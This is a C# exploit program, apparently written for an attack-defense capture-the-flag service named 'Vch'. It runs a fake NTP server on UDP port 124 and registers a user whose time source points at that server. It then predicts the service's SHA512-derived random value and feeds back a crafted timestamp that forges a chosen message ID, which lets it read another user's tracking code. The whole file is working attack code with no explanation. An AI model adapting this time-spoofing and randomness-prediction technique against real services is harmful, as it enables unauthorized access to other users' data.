using System;
using System.Collections;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using MongoDB.Bson;
using UdpProxy;
using Vch.Core.Helpers;
using Vch.Core.Meta;
using VchUtils;

namespace Exploit
{
    class Program
    {
        static void Main(string[] args)
        {

            try
            {
                var cancelationTokenSource = new CancellationTokenSource();

                var initialTime = new byte[8] {0,0, 1,0,0,0,0,0};

                NTPServer.StartListen(124, initialTime, cancelationTokenSource.Token);
                var client = new VchClient(new Uri($"http://{args[0]}:19999"));

                var targetMessage = UInt64.Parse(args[1]);

                var userInfo = client.RegisterUser(new UserMeta
                {
                    FirstName = "",
                    LastName = "",
                    TrackingCode = "bad",
                    VaultTimeSource = new IPEndpointWrapper
                    {
                        IPAddres = args[2],
                        Port = 124
                    },
                }).Result;

                cancelationTokenSource.Cancel();
                Thread.Sleep(100);

                var nextHash = PredictHash(userInfo, initialTime);

                var nextRnd = new byte[8];

                Array.Copy(nextHash, nextRnd, 6);

                nextRnd.PringB();

                var tmbits = new BitArray(targetMessage.ToBytes());
                var rndbits = new BitArray(nextRnd);

                var hackerTime = new byte[8];
                tmbits.Xor(rndbits).CopyTo(hackerTime, 0);

                NTPServer.StartListen(124, hackerTime, CancellationToken.None);
                var message = client.PostMessage(userInfo.UserId, "").GetAwaiter().GetResult();
                Console.WriteLine(message.userInfo.Meta.TrackingCode);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }

        private static byte[] PredictHash(UserInfo userInfo, byte[] initialTime)
        {
            var userIdNumber = UInt64.Parse(userInfo.UserId);

            var milllisecondLong = BitConverter.ToUInt64(initialTime);
            var xored = (userIdNumber ^ milllisecondLong).ToBytes();

            var currentShaSeed = new byte[8];
            Array.Copy(xored, currentShaSeed, 6);

            var shaProvider = new SHA512Managed();
            currentShaSeed.PringB();
            Console.WriteLine();
            var hash = shaProvider.ComputeHash(currentShaSeed);
            return hash;
        }


        static uint SwapEndianness(ulong x)
        {
            return (uint)(((x & 0x000000ff) << 24) +
                          ((x & 0x0000ff00) << 8) +
                          ((x & 0x00ff0000) >> 8) +
                          ((x & 0xff000000) >> 24));
        }

        class NTPServer
        {

            public static async Task StartListen(int port, byte[] time, CancellationToken token)
            {
                using (var server = new UdpListener(port))
                {

                    while (!token.IsCancellationRequested)
                    {
                        try
                        {
                            var udpMessageTask = server.Receive();

                            while (!udpMessageTask.IsCompleted && !token.IsCancellationRequested)
                            {
                                await Task.Delay(10);
                            }
                            if (token.IsCancellationRequested) return;

                            var udpMessage = udpMessageTask.Result;

                            var datagramm = new byte[48];

                            Array.Copy(time, 0, datagramm, 40, 8);
                            server.Reply(datagramm, udpMessage.Sender);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e);
                        }
                    }
                }

            }
        }
    }
    static class Ext
    {
        public static void PringB(this byte[] s)
        {
            for (int i = 0; i < s.Length; i++)
            {
                Console.Write(s[i] + " ");
            }
        }
    }
}

